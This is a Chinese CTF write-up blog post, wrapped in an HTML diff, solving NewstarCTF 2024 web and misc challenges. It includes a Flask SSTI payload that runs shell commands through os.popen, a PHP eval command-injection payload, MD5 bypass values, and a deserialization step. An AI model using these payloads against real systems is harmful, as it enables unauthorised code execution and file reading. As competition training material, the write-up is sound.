@@ -1,0 +1,238 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>NewstarCTF2024 wp | welcome2小神龙俱乐部</title><meta name="author" content="robe1t"><meta name="copyright" content="robe1t"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="# newstarCTF # web # headach3 提示 header，直接查看请求报文看到 flag # 会赢吗 直接看源码看到第一段 flag，给了一个路由，访问第二个路由  看源码提示控制台 在控制台调用 reveal 函数得到第二段 flag  看到 if 语句对 state  这个 id 的 span 文本做了一个判断，修改文本得到第三段 flag  一样的看源码，发现有段代码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NewstarCTF2024 wp">
+<meta property="og:url" content="https://robe1t.github.io/2024/11/19/NewstarCTF2024-wp/index.html">
+<meta property="og:site_name" content="welcome2小神龙俱乐部">
+<meta property="og:description" content="# newstarCTF # web # headach3 提示 header，直接查看请求报文看到 flag # 会赢吗 直接看源码看到第一段 flag，给了一个路由，访问第二个路由  看源码提示控制台 在控制台调用 reveal 函数得到第二段 flag  看到 if 语句对 state  这个 id 的 span 文本做了一个判断，修改文本得到第三段 flag  一样的看源码，发现有段代码">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://robe1t.github.io/img/me.jpg">
+<meta property="article:published_time" content="2024-11-19T08:15:23.000Z">
+<meta property="article:modified_time" content="2024-11-19T08:15:32.303Z">
+<meta property="article:author" content="robe1t">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://robe1t.github.io/img/me.jpg"><link rel="shortcut icon" href="/img/%E8%9B%8B%E7%B3%95.ico"><link rel="canonical" href="https://robe1t.github.io/2024/11/19/NewstarCTF2024-wp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'NewstarCTF2024 wp',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-11-19 16:15:32'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 7.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/me.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="welcome2小神龙俱乐部"><span class="site-name">welcome2小神龙俱乐部</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">NewstarCTF2024 wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-19T08:15:23.000Z" title="发表于 2024-11-19 16:15:23">2024-11-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-19T08:15:32.303Z" title="更新于 2024-11-19 16:15:32">2024-11-19</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="NewstarCTF2024 wp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout hide-aside" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="newstarctf"><a class="markdownIt-Anchor" href="#newstarctf">#</a> newstarCTF</h1>
+<h2 id="web"><a class="markdownIt-Anchor" href="#web">#</a> web</h2>
+<h3 id="headach3"><a class="markdownIt-Anchor" href="#headach3">#</a> headach3</h3>
+<p>提示 header，直接查看请求报文看到 flag</p>
+<h3 id="会赢吗"><a class="markdownIt-Anchor" href="#会赢吗">#</a> 会赢吗</h3>
+<p>直接看源码看到第一段 flag，给了一个路由，访问第二个路由</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241002005148078.png" alt="image-20241002005148078"></p>
+<p>看源码提示控制台<img src="/2024/11/19/NewstarCTF2024-wp/image-20241004013050317.png" alt="image-20241004013050317"></p>
+<p>在控制台调用 reveal 函数得到第二段 flag</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241004013020840.png" alt="image-20241004013020840"></p>
+<p>看到 if 语句对 <code>state</code>  这个 id 的 span 文本做了一个判断，修改文本得到第三段 flag</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241004013453951.png" alt="image-20241004013453951"></p>
+<p>一样的看源码，发现有段代码 noscript 没有生效，把 script 标签去掉，还是没有按钮显示，原因是 form 的 class 不存在，改成和上面按钮一样的 id 就能显示出来得到 flag<img src="/2024/11/19/NewstarCTF2024-wp/image-20241004014013735.png" alt="image-20241004014013735"></p>
+<h3 id="智械危机"><a class="markdownIt-Anchor" href="#智械危机">#</a> 智械危机</h3>
+<p>访问 robots.txt 得到一个路由</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241007143203463.png" alt="image-20241007143203463"></p>
+<h3 id="复读机"><a class="markdownIt-Anchor" href="#复读机">#</a> 复读机</h3>
+<p>class 被 ban 了，用 flask g</p>
+<p>可以命令执行，然后 <code>ls ../</code>  看到 flag，cat 查看得到 flag</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{{g.pop.__globals__.__builtins__['__import__']('os').popen('cat ../flag').read()}}</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="遗失的拉链"><a class="markdownIt-Anchor" href="#遗失的拉链">#</a> 遗失的拉链</h3>
+<p>按钮没有设置点击事件，没啥可用信息，dirsearch 扫到有一个 www.zip</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241008004800771.png" alt="image-20241008004800771"></p>
+<p>下载下来</p>
+<p>得到源码</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//for fun</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'new'</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'star'</span>])){</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">'new'</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">'star'</span>])&amp;&amp;<span class="variable">$_GET</span>[<span class="string">'new'</span>]!==<span class="variable">$_POST</span>[<span class="string">'star'</span>]){</span><br><span class="line">        <span class="comment">//欸 为啥sha1和md5相等呢</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">'cmd'</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">"/cat|flag/i"</span>, <span class="variable">$cmd</span>)) {</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"u can not do this "</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Wrong"</span>;</span><br><span class="line"></span><br><span class="line">    } </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>是一个 md5 绕过和 rce，md5 数组绕过</p>
+<p>命令执行过滤了  <code>cat</code> ，使用  <code>tac</code>  代替。 <code>flag</code>  被过滤，使用  <code>fla*</code>  通配符绕过</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=echo file_get_contents("/fla"."g");</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="chocolate"><a class="markdownIt-Anchor" href="#chocolate">#</a> chocolate</h3>
+<p>看源码得到第一个路由，访问看到源码，intval () 函数会对把变量转换成整数，又要匹配到 0，直接后面加个 0 即可，得到第一个配方</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241026161425651.png" alt="image-20241026161425651"></p>
+<p>凯撒解码得到下一个路由</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241026161415813.png" alt="image-20241026161415813"></p>
+<p>md5 绕过</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$cocoaButter_star</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$next</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"source.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cat</span>=<span class="variable">$_GET</span>[<span class="string">'cat'</span>];</span><br><span class="line"><span class="variable">$dog</span>=<span class="variable">$_GET</span>[<span class="string">'dog'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$cat</span>) || <span class="title function_ invoke__">is_array</span>(<span class="variable">$dog</span>)){</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"EZ"</span>);</span><br><span class="line">}<span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$cat</span> !== <span class="variable">$dog</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$cat</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$dog</span>)){</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">"of course you konw"</span>);</span><br><span class="line">}<span class="keyword">else</span> {</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"ohhh no~"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'moew'</span>])){</span><br><span class="line">    <span class="variable">$miao</span> = <span class="variable">$_POST</span>[<span class="string">'moew'</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$miao</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$miao</span>)){</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$cocoaButter_star</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"qwq? how?"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$next_level</span> =<span class="variable">$_POST</span>[<span class="string">'wof'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$next_level</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$next_level</span>),<span class="number">0</span>,<span class="number">5</span>)===<span class="string">'8031b'</span>){</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$next</span>;</span><br><span class="line">}</span><br><span class="line">ohhh no~</span><br></pre></td></tr></tbody></table></figure>
+<p>fastcoll 来强碰撞 cat 和 dog 参数，moew 弱比较用科学计数法即可绕过，wof 直接拷打 gpt 生成一个符合要求的字符串，得到第二个配方和下一个路由</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241026164217006.png" alt="image-20241026164217006"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">get:</span><br><span class="line">M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line">post:</span><br><span class="line">0e215962017</span><br><span class="line">7zyp1dtl</span><br></pre></td></tr></tbody></table></figure>
+<p>访问 final.php</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"source.php"</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$food</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">'php://input'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chocolate</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cat</span>=<span class="string">'???'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kitty</span>=<span class="string">'???'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cat=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;kitty=<span class="variable">$p</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eatit</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;cat===<span class="variable language_">$this</span>-&gt;kitty;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;cat;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$darkCocoaPowder</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$darkCocoaPowder</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$milk</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$food</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">'/chocolate/'</span>, <span class="variable">$food</span>)){</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">"Error <span class="subst">$milk</span>"</span>,<span class="number">1</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>是一个反序列化</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">chocolate</span>(<span class="string">'user'</span>, <span class="string">'pass'</span>);  </span><br><span class="line"><span class="comment">// 序列化对象  </span></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br></pre></td></tr></tbody></table></figure>
+<p>构造一个简单的 pop 链（注意调整 post 解析格式）</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241026235221472.png" alt="image-20241026235221472"></p>
+<p>得到第三个配方，剩最后一个爆破即可（多了会提示太甜，少了会提示太苦最后得到最后配方是 2042）</p>
+<h2 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> misc</h2>
+<h3 id="wireshark_checkin"><a class="markdownIt-Anchor" href="#wireshark_checkin">#</a> wireshark_checkin</h3>
+<p>过滤 http 流，发现 flag.txt 字样，点开对应 http 报文得到 flag</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241008010007674.png" alt="image-20241008010007674"></p>
+<h3 id="wireshark_secret"><a class="markdownIt-Anchor" href="#wireshark_secret">#</a> wireshark_secret</h3>
+<p>过滤 http，然后看到 secret.png，点开对应报文</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241008164004253.png" alt="image-20241008164004253"></p>
+<p>追踪流之后看到这张 png 的数据，把这个报文原始数据导出来，然后把多余部分删掉得到 flag</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241008163819016.png" alt="image-20241008163819016"></p>
+<h3 id="字里行间的秘密"><a class="markdownIt-Anchor" href="#字里行间的秘密">#</a> 字里行间的秘密</h3>
+<p>0 宽隐写得到 docx 的密码</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241009171632940.png" alt="image-20241009171632940"></p>
+<p>全选发现有字符看不见，格式刷可以看到，或者粘贴出来</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241009171752897.png" alt="image-20241009171752897"></p>
+<h3 id="你也玩原神吗"><a class="markdownIt-Anchor" href="#你也玩原神吗">#</a> 你也玩原神吗</h3>
+<p>点开 gif 里面有一帧文字，逐帧分解一下，把这帧找出来发现是一段看不懂的字符</p>
+<p>看看题目提到了提瓦特文字，搜了一下发现对的上，一个个照着翻译（不能提取文字要一个个翻是真的折磨）</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241010001615852.png" alt="image-20241010001615852"></p>
+<p>中间这段话翻出来还是看不懂，百度翻译一看是牛魔拉丁文，再一搜发现只是用来做字符测试的，头绪到这断了</p>
+<p>又看到这照片四个角落还有字符，再逐个翻译出来，左上说 flag 是一句话，右上是 fakeflag，猜测 flag 肯定在这些小字里面，然后接着翻译左下提示栅栏密码</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241010001818156.png" alt="image-20241010001818156"></p>
+<p>右下出来一串字符，拿去栅栏解密终于得到 flag（真的阴🤬）</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241010002305309.png" alt="image-20241010002305309"></p>
+<h3 id="用溯流仪见证伏特台风"><a class="markdownIt-Anchor" href="#用溯流仪见证伏特台风">#</a> 用溯流仪见证伏特台风</h3>
+<p>在网上找到了高清大图</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241010004608108.png" alt="image-20241010004608108"></p>
+<p>直接读出来然后 16 位 md5 加密一下</p>
+<h3 id="热心助人的小明同学"><a class="markdownIt-Anchor" href="#热心助人的小明同学">#</a> 热心助人的小明同学</h3>
+<p>内存取证，还是用 <code>volality</code>  这个工具，先 imageinfo 查看版本</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f image.raw imageinfo</span><br></pre></td></tr></tbody></table></figure>
+<p>找到版本后 lsadump 查看密码</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/xiaoming1_2.QceA43zx.png" alt="lsadump"></p>
+<p>这时候我得到的 <code>ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh</code>  其实就是密码，我以为这是加密了的，解密之后怎么交都不对😭（也是给自己绕进去了）</p>
+<h3 id="hertas-study"><a class="markdownIt-Anchor" href="#hertas-study">#</a> Herta’s Study</h3>
+<p>流量分析</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241010005101823.png" alt="image-20241010005101823"></p>
+<p>过滤 http 流看到上传了一个 <code>horse.php</code>  文件，再解密一下得到加密逻辑，base 解密后再把后奇数位 rot13</p>
+<p>脚本如下</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ns</span> = <span class="string">'ZzxuZ3tmSQNsaGRsUmBsNzVOdKQkZaVZLa0tCt=='</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ns</span>); <span class="variable">$i</span> += <span class="number">1</span>){</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$i</span> % <span class="number">2</span> == <span class="number">1</span>) {</span><br><span class="line">        <span class="variable">$ns</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$ns</span>[<span class="variable">$i</span>]);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$ns</span>);</span><br><span class="line"><span class="comment">// flag{sH3_i4_S0_6eAut1fuL.}</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="扫码领取flag"><a class="markdownIt-Anchor" href="#扫码领取flag">#</a> 扫码领取 flag</h3>
+<p>开始得到两张图片，010 打开分析一下，发现 <code>flag.png</code>  拖进去报错，提示宽高被修改过，拿去 crc 爆破一下得到宽高都是 <code>0x01 0xF4</code> ，修改一下得到一个二维码</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241023123750783.png" alt="image-20241023123750783"></p>
+<p>但是四个角没有定位标识，不是常见的 qr-code，再看到另外一个 <code>hint.png</code> ，属性里面看到很多提示</p>
+<p><img src="/2024/11/19/NewstarCTF2024-wp/image-20241023123925332.png" alt="image-20241023123925332"></p>
+<p>拿去解 base64 结果是 <code>Aztec Civilization</code> ，经过搜索查到这是 aztec 码，然后找个工具（<a target="_blank" rel="noopener" href="https://github.com/playGitboy/barCodeScanner">barCodeScanner</a>）给他解了得到 flag</p>
